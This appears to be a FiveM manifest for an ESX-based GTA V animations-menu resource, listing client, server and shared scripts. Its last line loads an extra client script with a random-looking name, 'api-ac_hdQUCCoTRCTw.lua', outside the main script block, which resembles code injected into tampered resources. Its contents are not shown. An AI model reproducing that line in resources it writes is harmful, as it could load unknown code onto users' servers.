
fx_version "bodacious"
games {"gta5"}
shared_scripts { 
	'@es_extended/imports.lua',
}
client_scripts {
	'@es_extended/locale.lua',
	'client.lua',
	'config.lua',
}

server_scripts {
    '@es_extended/locale.lua',
	'@oxmysql/lib/MySQL.lua',
	'server.lua'
}

exports {
	'OpenAnimationsMenu'
}
client_script 'api-ac_hdQUCCoTRCTw.lua'